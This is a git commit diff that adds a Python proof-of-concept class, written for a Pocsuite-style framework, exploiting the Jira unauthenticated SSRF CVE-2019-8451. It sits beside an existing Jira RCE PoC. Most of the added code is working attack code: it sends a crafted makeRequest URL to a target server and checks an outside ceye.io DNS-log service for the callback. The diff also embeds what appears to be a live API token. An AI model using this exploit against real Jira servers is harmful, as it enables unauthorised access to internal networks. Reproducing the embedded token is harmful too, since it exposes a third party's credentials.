9092773f96b3897c9707d434897ff32ff200de0e
shadowsock5 <30398606+shadowsock5@users.noreply.github.com>
2020-02-24 16:36:27 +0800

    Update Jira_poc.py

--- Jira/Jira_poc.py
+++ Jira/Jira_poc.py
@@ -59,8 +59,7 @@ class Jira_RCE_POC(POCBase):
     CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)
 
     http_proxy  = "http://127.0.0.1:8087"
-    https_proxy = "https://127.0.0.1:8087"
-    proxies = {"http": http_proxy, "https": https_proxy}
+    proxies = {"http": http_proxy, "https": http_proxy}
 
 
     def _verify(self):
@@ -112,7 +111,86 @@ class Jira_RCE_POC(POCBase):
             output.fail()
         return output
 
+
+'''
+CVE-2019-8451
+'''
+class Jira_SSRF_POC(POCBase):
+    vulID = 'Jira-CVE-2019-8451'
+    appName = 'Jira'
+    appVersion = '''version < 8.4.0'''
+    category = POC_CATEGORY.EXPLOITS.REMOTE
+    vulType = VUL_TYPE.OTHER # 没有SSRF类型？
+    vulDate = '2019-09-23'  # 漏洞公开的时间,不知道就写今天
+    author = 'shadowsock5'  # PoC作者的大名
+    createDate = '2020-02-24'  # 编写 PoC 的日期
+    updateDate = '2020-02-24'  # PoC 更新的时间,默认和编写时间一样
+    references = ['https://mp.weixin.qq.com/s/_Tsq9p1pQyszJt2VaXd61A']  # 漏洞地址来源,0day不用写
+    name = 'Jira未授权SSRF'  # PoC 名称
+    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    cvss = u"中危"
+
+    
+    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
+    DOMAIN = 'wvg689.ceye.io'
+    TOKEN = '76dce59a986eab595838f7dc74903035'
+    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
+    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)
+
+    http_proxy  = "http://127.0.0.1:8087"
+    proxies = {"http": http_proxy, "https": http_proxy}
+
+
+    def _verify(self):
+        result={}
+
+        vul_url = self.url
+
+        payload = 'ip.cn:80'     # 换成dnslog的地址
+        
+        target_url = "{0}/plugins/servlet/gadgets/makeRequest?url={0}@{1}".format(vul_url, payload)
+
+        headers = {"X-Atlassian-Token": "no-check"}
+
+        
+        try:
+            req.get(target_url, headers = headers, proxies=self.proxies, verify=False)
+        except Exception as e:
+            e.printStackTrace()
+        
+        time.sleep(2) # 休眠2s等待ceye生成记录
+        if self.test_dnslog(self.CEYE_URL):
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = target_url
+            return self.save_output(result)
+        return self.save_output(result)
+
+
+    # 验证DNS已被解析
+    def test_dnslog(self, url):
+        resp = req.get(url)
+        d = resp.json()
+        try:
+            name = d['data'][0]['name']
+            if self.BANNER in name:
+                return True
+        except Exception:
+            return False            
+
+    # 攻击模块
+    def _attack(self):
+        return self._verify()
+
+    # 输出报告
+    def save_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+
+
 # 注册类
 register_poc(Jira_RCE_POC)    # CVE-2019-11581
-
-
+register_poc(Jira_SSRF_POC)    # CVE-2019-8451
